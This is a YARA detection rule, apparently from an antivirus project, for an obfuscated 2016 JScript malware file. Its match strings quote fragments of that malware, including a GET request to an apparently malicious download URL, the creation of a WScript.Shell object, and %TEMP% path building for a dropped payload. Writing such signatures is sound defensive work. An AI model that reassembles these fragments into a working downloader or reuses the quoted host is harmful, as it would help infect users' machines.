rule sig_20160427_a26db286fb3e73695f17d3c2687c493f {
  meta:
    description = "datamaliciousorder - file 20160427_a26db286fb3e73695f17d3c2687c493f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8ca84fe1f5b6b42252bbc043b3bb275c207511995245a2457be3fdfbbcc6327b"

  strings:
    $s1  = "QscaxLpjea[GpebdBlpfj](\"G\" + \"ET\", \"http://pediatriayvacunas.com/q0wps\", false);" fullword ascii
    $s2  = "function OxlyoRdefm() {return RatlsVryqu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ZGhO0PP" ascii
    $s3  = "function OxlyoRdefm() {return RatlsVryqu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ZGhO0PP" ascii
    $s4  = "function WzxyuVkwba(IzwcwPvdlg, CzasfVutvv){RaxaiSknmj = RaxaiSknmj * 1; return IzwcwPvdlg - CzasfVutvv;};" fullword ascii
    $s5  = "var RatlsVryqu = function StjtyJshnp() {return KawfeHmgmk[GocfdVwnkk](\"WScript\"+\".Shell\");}(), HtecmAbcnj = 11;" fullword ascii
    $s6  = "var KawfeHmgmk = this[\"WScript\"];" fullword ascii
    $s7  = "function LweyeNqlnm()" fullword ascii
    $s8  = "function DttvbWpawj(){return EjgffMeqxw + \"\";};" fullword ascii
    $s9  = "function RxuepRzegq() {return ((MxeysAropt == true) && (MxeysAropt == ZgsjmTjown)) ? 1 : RaxaiSknmj;};" fullword ascii
    $s10 = "var MaftqTxsoy = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "function TqiquWhygh(){return 23;};" fullword ascii
    $s12 = "return WzxyuVkwba(TqrvhOlfwx, HdggeOovgw);" fullword ascii
    $s13 = "}while (FjkroOxdkq);" fullword ascii
    $s14 = "var MxeysAropt = false;" fullword ascii
    $s15 = "ItoxoZsixj = true;" fullword ascii
    $s16 = "var ZgsjmTjown = false;" fullword ascii
    $s17 = "function MbizkKjmdr(){return GocfdVwnkk;};" fullword ascii
    $s18 = "function QkrjfHzlij(DradtVzcdm) {var FblaaQvypu = (1, 2, 3, 4, 5, DradtVzcdm); return FblaaQvypu;};" fullword ascii
    $s19 = "MxeysAropt = true; " fullword ascii
    $s20 = "var ItoxoZsixj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}